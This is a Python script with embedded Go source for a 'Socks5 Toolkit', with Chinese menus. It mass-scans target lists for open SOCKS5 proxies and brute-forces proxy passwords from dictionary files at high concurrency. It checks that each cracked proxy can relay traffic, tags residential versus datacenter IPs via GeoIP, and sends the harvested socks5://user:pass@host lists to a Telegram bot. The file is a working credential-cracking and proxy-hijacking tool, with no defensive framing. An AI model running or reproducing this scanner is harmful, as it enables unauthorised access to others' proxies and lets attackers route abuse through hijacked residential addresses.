import subprocess
import sys
import tempfile
import os
import shutil
import hashlib
import json
import time
from datetime import datetime, timedelta
import re

# --- 依赖库检查 ---
def check_dependencies():
    missing = []
    try: from tqdm import tqdm
    except ImportError: missing.append("tqdm")
    
    try: import requests
    except ImportError: missing.append("requests")
        
    try: import geoip2.database
    except ImportError: missing.append("geoip2")

    if missing:
        print(f"错误: 缺少依赖库: {', '.join(missing)}")
        print(f"请运行: pip install {' '.join(missing)}")
        sys.exit(1)

check_dependencies()
from tqdm import tqdm
import requests
import geoip2.database

# ==========================================
# 配置模块
# ==========================================
CONFIG_FILE = "config.json"

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f: json.dump(config, f, indent=4)

def handle_config_menu(config):
    while True:
        print("\n--- 设置菜单 ---")
        print(f"  [1] Bot Token:         {'*' * 10 if config.get('bot_token') else '未设置'}")
        print(f"  [2] Chat ID:           {config.get('chat_id') or '未设置'}")
        print(f"  [3] 自定义标识名:    {config.get('custom_id_key') or 'VPS'}")
        print(f"  [4] 自定义标识值:    {config.get('custom_id_value') or '未设置'}")
        print("\n  [b] 返回主菜单")
        
        choice = input("\n请选择要修改的项: ").lower()
        if choice == '1': config['bot_token'] = input("Bot Token: ").strip()
        elif choice == '2': config['chat_id'] = input("Chat ID: ").strip()
        elif choice == '3': config['custom_id_key'] = input("标识名: ").strip()
        elif choice == '4': config['custom_id_value'] = input("标识值: ").strip()
        elif choice == 'b': break
        save_config(config)

def send_telegram_file(config, file_path):
    if not config.get("bot_token") or not config.get("chat_id"): return
    if not os.path.exists(file_path): return

    print(f" >> 正在推送 {os.path.basename(file_path)} 到 Telegram...", end=" ")
    try:
        url = f"https://api.telegram.org/bot{config['bot_token']}/sendDocument"
        count = sum(1 for _ in open(file_path, 'r', encoding='utf-8', errors='ignore'))
        caption = (f"🔍 任务完成\n"
                   f"🏷 {config.get('custom_id_key', 'VPS')}: {config.get('custom_id_value', '')}\n"
                   f"📁 文件: {os.path.basename(file_path)}\n"
                   f"📊 数量: {count}")
        with open(file_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': config['chat_id'], 'caption': caption}, timeout=30)
        print("完成")
    except Exception as e: print(f"失败: {e}")

# ==========================================
# GO 核心代码区 (流水线模式 - 极速)
# ==========================================

# 1. 协议验证器
GO_SOURCE_CODE_PROTOCOL_VERIFIER = r'''
package main
import ("bufio";"flag";"fmt";"net";"os";"strings";"sync";"sync/atomic";"time")
func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	for target := range jobs {
		conn, err := net.DialTimeout("tcp", target, timeout)
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			conn.Write([]byte{0x05, 0x01, 0x00})
			resp := make([]byte, 2)
			n, _ := conn.Read(resp)
			conn.Close()
			if n == 2 && resp[0] == 0x05 { fmt.Printf("S|%s\n", target) }
		}
		localCount++
		if localCount >= 50 { atomic.AddUint64(counter, 50); fmt.Println("P"); localCount = 0 }
	}
	if localCount > 0 { atomic.AddUint64(counter, uint64(localCount)); fmt.Println("P") }
}
func main() {
	inputFile := flag.String("inputFile", "", "Input File")
	threads := flag.Int("threads", 1000, "Threads")
	timeout := flag.Int("timeout", 5, "Timeout")
	flag.Parse()
	file, err := os.Open(*inputFile); if err != nil { return }
	defer file.Close()
	scanner := bufio.NewScanner(file)
	jobs := make(chan string, *threads*2); var wg sync.WaitGroup; var count uint64
	for i := 0; i < *threads; i++ { wg.Add(1); go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count) }
	go func() {
		for scanner.Scan() { t := strings.TrimSpace(scanner.Text()); if t != "" { jobs <- t } }
		close(jobs)
	}()
	wg.Wait()
}
'''

# 2. 深度扫描器 (Pipeline Mode)
# 逻辑：认证失败 -> 立即挂断 (耗时极低)
#       认证成功 -> 保持连接 -> 尝试 CONNECT (复用连接，耗时最低)
GO_SOURCE_CODE_SCANNER = r'''
package main
import ("flag";"fmt";"net";"os";"strings";"sync";"sync/atomic";"time";"encoding/binary")

var scanMode int
type Job struct { Host string; Port string; User string; Pass string }

// 快速联网检测
func verifyTraffic(conn net.Conn) bool {
    // 尝试连接 www.microsoft.com:80 (体积极小的请求)
    domain := "www.microsoft.com"
    req := []byte{0x05, 0x01, 0x00, 0x03, byte(len(domain))}
    req = append(req, domain...)
    
    portBytes := make([]byte, 2)
    binary.BigEndian.PutUint16(portBytes, 80)
    req = append(req, portBytes...)
    
    conn.SetDeadline(time.Now().Add(5 * time.Second))
    if _, err := conn.Write(req); err != nil { return false }
    
    resp := make([]byte, 10)
    n, err := conn.Read(resp)
    if err != nil || n < 2 { return false }
    
    // 0x00 表示成功连接，证明代理拥有转发权限
    return resp[0] == 0x05 && resp[1] == 0x00
}

func worker(jobs <-chan Job, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	
	for j := range jobs {
		target := net.JoinHostPort(j.Host, j.Port)
		conn, err := net.DialTimeout("tcp", target, timeout)
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			conn.Write([]byte{0x05, 0x02, 0x00, 0x02})
			reply := make([]byte, 2)
			n, _ := conn.Read(reply)
			
			if n > 1 && reply[0] == 0x05 {
				authMethod := reply[1]
				
				// 1. 免密模式
				if authMethod == 0x00 {
					if scanMode == 0 || scanMode == 1 { 
                        // 认证已通过，立即在同一连接中测试联网
                        if verifyTraffic(conn) {
						    fmt.Printf("S|%s|%s||OPEN\n", j.Host, j.Port) 
                        }
					}
				} else if authMethod == 0x02 {
				// 2. 密码模式
					if (scanMode == 0 || scanMode == 2) && j.User != "" {
						authReq := []byte{0x01}
						authReq = append(authReq, byte(len(j.User))); authReq = append(authReq, j.User...)
						authReq = append(authReq, byte(len(j.Pass))); authReq = append(authReq, j.Pass...)
						conn.Write(authReq)
						
						authResp := make([]byte, 2)
						n2, _ := conn.Read(authResp)
						
                        // 只有密码正确 (0x00) 才会进入 verifyTraffic
						if n2 > 1 && authResp[0] == 0x01 && authResp[1] == 0x00 {
                            // 密码正确，立即复用连接测试联网
                            if verifyTraffic(conn) {
							    fmt.Printf("S|%s|%s|%s|%s\n", j.Host, j.Port, j.User, j.Pass)
                            }
						}
                        // 如果密码错误，循环直接结束，不会浪费时间去 CONNECT
					}
				}
			}
			conn.Close()
		}
		localCount++
		if localCount >= 50 { atomic.AddUint64(counter, 50); fmt.Println("P"); localCount = 0 }
	}
	if localCount > 0 { atomic.AddUint64(counter, uint64(localCount)); fmt.Println("P") }
}

func main() {
	proxyFile := flag.String("proxyFile", "", "List")
	dictFile := flag.String("dictFile", "", "Dict")
	mode := flag.Int("mode", 0, "Mode")
	threads := flag.Int("threads", 1000, "Threads")
	timeout := flag.Int("timeout", 5, "Timeout")
	flag.Parse()
	scanMode = *mode
	
	pData, _ := os.ReadFile(*proxyFile)
	pLines := strings.Split(string(pData), "\n")
	var proxies []string
	for _, l := range pLines { if t := strings.TrimSpace(l); t != "" { proxies = append(proxies, t) } }
	
	var dLines []string
	if *mode != 1 {
		dData, _ := os.ReadFile(*dictFile)
		lines := strings.Split(string(dData), "\n")
		for _, l := range lines { if t := strings.TrimSpace(l); t != "" { dLines = append(dLines, t) } }
	}
	
	jobs := make(chan Job, *threads*2); var wg sync.WaitGroup; var count uint64
	for i := 0; i < *threads; i++ { wg.Add(1); go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count) }
	
	go func() {
		for _, proxy := range proxies {
			parts := strings.Split(proxy, ":")
			if len(parts) != 2 { continue }
			if *mode == 1 {
				jobs <- Job{Host: parts[0], Port: parts[1], User: "", Pass: ""}
			} else {
				if len(dLines) > 0 {
					for _, cred := range dLines {
						cParts := strings.SplitN(cred, ":", 2)
						if len(cParts) == 2 { jobs <- Job{Host: parts[0], Port: parts[1], User: cParts[0], Pass: cParts[1]} }
					}
				} else if *mode == 0 {
				    jobs <- Job{Host: parts[0], Port: parts[1], User: "", Pass: ""}
				}
			}
		}
		close(jobs)
	}()
	wg.Wait()
}
'''

# ==========================================
# GeoIP
# ==========================================
class GeoIPManager:
    def __init__(self, db_dir="geoip_db"):
        self.db_dir = db_dir
        self.asn_db = os.path.join(db_dir, "GeoLite2-ASN.mmdb")
        self.city_db = os.path.join(db_dir, "GeoLite2-City.mmdb")
        self.readers = {}
        self.residential_keywords = ["cable", "dsl", "fiber", "residential", "home", "telecom"]
        self.datacenter_keywords = ["cloud", "hosting", "vps", "server", "data", "center"]

    def _download_file(self, url, dest_path):
        print(f"下载 GeoIP 库: {os.path.basename(dest_path)} ...")
        try:
            with requests.get(url, stream=True, timeout=20) as r:
                r.raise_for_status()
                with open(dest_path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
            return True
        except: return False

    def ensure_databases(self):
        os.makedirs(self.db_dir, exist_ok=True)
        required = [("GeoLite2-ASN.mmdb", self.asn_db), ("GeoLite2-City.mmdb", self.city_db)]
        missing = [p for n, p in required if not os.path.exists(p)]
        if not missing: return self._init_readers()
        
        base_url = "https://github.com/mojolabs-id/GeoLite2-Database/releases/download"
        dates = [datetime.now().strftime("%Y.%m.%d"), (datetime.now()-timedelta(days=1)).strftime("%Y.%m.%d")]
        
        for name, path in required:
            if os.path.exists(path): continue
            for d in dates:
                if self._download_file(f"{base_url}/{d}/{name}", path): break
        return self._init_readers()

    def _init_readers(self):
        try:
            if os.path.exists(self.asn_db): self.readers['asn'] = geoip2.database.Reader(self.asn_db)
            if os.path.exists(self.city_db): self.readers['city'] = geoip2.database.Reader(self.city_db)
            return True
        except: return False

    def lookup(self, ip):
        if not self.readers: return ""
        cn, asn, typ = "未知", "未知ISP", "普通"
        is_broadcast = False
        
        if 'city' in self.readers:
            try:
                r = self.readers['city'].city(ip)
                cn = r.country.names.get('zh-CN', r.country.name)
                if r.registered_country.iso_code != r.country.iso_code: is_broadcast = True
            except: pass
        
        if 'asn' in self.readers:
            try:
                r = self.readers['asn'].asn(ip)
                asn = r.autonomous_system_organization or "Unknown"
                alo = asn.lower()
                if any(k in alo for k in self.residential_keywords): typ = "住宅IP"
                elif any(k in alo for k in self.datacenter_keywords): typ = "数据中心"
            except: pass
            
        clean_asn = re.sub(r'[^a-zA-Z0-9_\-]', '_', asn)[:20]
        tags = []
        if typ != "普通": tags.append(typ)
        if is_broadcast: tags.append("广播IP")
        t_str = f"[{']['.join(tags)}]" if tags else ""
        return f"{cn} {clean_asn} {t_str}".strip()

    def close(self):
        for r in self.readers.values(): r.close()

# ==========================================
# 工具函数
# ==========================================
COMPILED_BINARIES = {}
CACHE_DIR = ".socks5_toolkit_cache"

def get_go_path():
    path = shutil.which("go")
    if path: return path
    for p in ["/usr/local/go/bin/go", "C:\\Go\\bin\\go.exe"]:
        if os.path.exists(p): return p
    return None

def compile_go_binaries():
    go_exec = get_go_path()
    if not go_exec: print("错误: 未找到 Go 环境"); return False
    os.makedirs(CACHE_DIR, exist_ok=True)
    sources = {"protocol_verifier": GO_SOURCE_CODE_PROTOCOL_VERIFIER, "scanner": GO_SOURCE_CODE_SCANNER}
    build_env = os.environ.copy()
    temp_base = tempfile.gettempdir()
    if 'HOME' not in build_env: build_env['HOME'] = temp_base
    build_env['GOCACHE'] = os.path.join(temp_base, 'go_build_cache')
    os.makedirs(build_env['GOCACHE'], exist_ok=True)

    print("正在检查核心组件 (Pipeline模式)...")
    for name, code in sources.items():
        out_path = os.path.join(CACHE_DIR, name + (".exe" if sys.platform=="win32" else ""))
        hash_path = os.path.join(CACHE_DIR, name + ".hash")
        cur_hash = hashlib.sha256(code.encode()).hexdigest()
        
        if not (os.path.exists(out_path) and os.path.exists(hash_path) and open(hash_path).read() == cur_hash):
            print(f"  - 编译 {name}...")
            src_path = os.path.join(CACHE_DIR, name + ".go")
            with open(src_path, "w", encoding="utf-8") as f: f.write(code)
            res = subprocess.run([go_exec, "build", "-ldflags", "-s -w", "-o", out_path, src_path], capture_output=True, env=build_env)
            if res.returncode != 0:
                print(f"编译失败: {res.stderr.decode()}")
                return False
            with open(hash_path, 'w') as f: f.write(cur_hash)
        COMPILED_BINARIES[name] = out_path
    return True

def run_go_process(bin_name, args, total_tasks, raw_output_file):
    bin_path = COMPILED_BINARIES.get(bin_name)
    if not bin_path: return
    print(f"\n启动引擎 | 任务量: {total_tasks}")
    
    success_count = 0
    try:
        proc = subprocess.Popen([bin_path] + args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8', errors='replace', bufsize=1)
        
        with tqdm(total=total_tasks, unit="chk", dynamic_ncols=True, mininterval=0.5) as pbar, open(raw_output_file, 'w', encoding='utf-8') as f:
            pbar.set_postfix(命中=0)
            while True:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None: break
                if not line: continue
                line = line.strip()
                if line == "P": 
                    pbar.update(50)
                elif line.startswith("S|"):
                    success_count += 1
                    f.write(line + "\n")
                    f.flush()
                    pbar.set_postfix(命中=success_count)
    except Exception as e: print(f"错误: {e}")

# ==========================================
# 业务逻辑
# ==========================================

def execute_protocol_detection(config, geoip_mgr):
    print("\n[协议探测] - 初步筛选 Socks5 端口")
    f_path = input("输入文件: ").strip().strip('"')
    if not os.path.exists(f_path): return

    threads = input("并发 (1000): ") or "1000"
    tdir = tempfile.mkdtemp()
    try:
        raw_out = os.path.join(tdir, "raw_proto.txt")
        total = sum(1 for x in open(f_path, errors='ignore'))
        
        run_go_process("protocol_verifier", ["-inputFile", f_path, "-threads", threads], total, raw_out)
        
        valid_ips = []
        if os.path.exists(raw_out):
            with open(raw_out, 'r') as f:
                for line in f:
                    if line.startswith("S|"): valid_ips.append(line.strip().split("|")[1])
        
        if not valid_ips:
            print("[-] 无结果")
            return
            
        print(f"\n[+] 存活: {len(valid_ips)}")
        
        ts = datetime.now().strftime("%Y%m%d-%H%M")
        fname = f"Protocol_Valid_{ts}.txt"
        use_geo = input("GeoIP (y/n): ").lower() == 'y'
        
        with open(fname, 'w', encoding='utf-8') as f:
            for ip in valid_ips:
                info = f" #{geoip_mgr.lookup(ip.split(':')[0])}" if use_geo else ""
                f.write(f"{ip}{info}\n")
        
        print(f"[保存] {fname}")
        send_telegram_file(config, fname)
        
    finally: shutil.rmtree(tdir)

def execute_proxy_scanning(config, geoip_mgr):
    print("\n[代理扫描] - 深度检测 (CONNECT Microsoft)")
    f_path = input("输入文件: ").strip().strip('"')
    if not os.path.exists(f_path): return

    print("\n[1] Public (免密)  [2] Private (密码)  [3] Both")
    c = input("选择: ")
    mode = 0
    tdir = tempfile.mkdtemp()
    dict_file = os.path.join(tdir, "empty.txt")
    
    try:
        if c == '1':
            mode = 1
            open(dict_file,'w').close()
        elif c in ['2', '3']:
            mode = 2 if c=='2' else 0
            print("\n[字典] [1] 组合  [2] 同名  [3] 单文件")
            dc = input("选择: ")
            d_out = os.path.join(tdir, "d.txt")
            if dc == '1':
                u = open(input("User: ").strip('"')).read().splitlines()
                p = open(input("Pass: ").strip('"')).read().splitlines()
                with open(d_out,'w') as f:
                    for x in u:
                        for y in p: f.write(f"{x.strip()}:{y.strip()}\n")
            elif dc == '2':
                w = open(input("List: ").strip('"')).read().splitlines()
                with open(d_out,'w') as f:
                    for x in w: f.write(f"{x.strip()}:{x.strip()}\n")
            elif dc == '3':
                shutil.copy(input("File: ").strip('"'), d_out)
            else: return
            dict_file = d_out
        else: return
        
        threads = input("并发 (1000): ") or "1000"
        raw_out = os.path.join(tdir, "raw_scan.txt")
        
        pc = sum(1 for x in open(f_path, errors='ignore'))
        dc = 1
        if mode != 1: dc = sum(1 for x in open(dict_file)) or 1
        total = pc if mode == 1 else pc * dc
        
        run_go_process("scanner", 
                      ["-proxyFile", f_path, "-dictFile", dict_file, "-mode", str(mode), "-threads", threads],
                      total, raw_out)
        
        pub, priv = set(), set()
        if os.path.exists(raw_out):
            with open(raw_out, 'r') as f:
                for line in f:
                    if not line.startswith("S|"): continue
                    p = line.strip().split("|")
                    if len(p) >= 5:
                        if p[4] == "OPEN": pub.add(f"socks5://{p[1]}:{p[2]}")
                        else: priv.add(f"socks5://{p[3]}:{p[4]}@{p[1]}:{p[2]}")
        
        ts = datetime.now().strftime("%Y%m%d-%H%M")
        use_geo = input("\nGeoIP (y/n): ").lower() == 'y'
        
        def save_and_push(data, tag):
            if not data: return
            fn = f"{tag}_{ts}.txt"
            with open(fn, 'w') as f:
                for item in sorted(list(data)):
                    ip = item.split("@")[1].split(":")[0] if "@" in item else item.split("//")[1].split(":")[0]
                    info = f" #{geoip_mgr.lookup(ip)}" if use_geo else ""
                    f.write(f"{item}{info}\n")
            print(f"[保存] {fn} ({len(data)})")
            send_telegram_file(config, fn)
            
        save_and_push(pub, "Public")
        save_and_push(priv, "Private")
        if not pub and not priv: print("[-] 无有效代理")
            
    finally: shutil.rmtree(tdir)

# --- 主入口 ---
def main():
    if not compile_go_binaries(): sys.exit(1)
    geoip = GeoIPManager()
    geoip.ensure_databases()
    config = load_config()
    
    print("\n" + "="*50)
    print(" Socks5 Toolkit (Pipeline Mode)")
    print("="*50)

    try:
        while True:
            print("\n--- 菜单 ---")
            print("  [1] 协议探测 (Protocol)")
            print("  [2] 代理扫描 (Scanner)")
            print("  [3] 设置 (Settings)")
            print("  [q] 退出")
            
            c = input("\n选择: ").lower()
            if c == '1': execute_protocol_detection(config, geoip)
            elif c == '2': execute_proxy_scanning(config, geoip)
            elif c == '3': handle_config_menu(config)
            elif c == 'q': break
    finally:
        geoip.close()

if __name__ == "__main__": main()
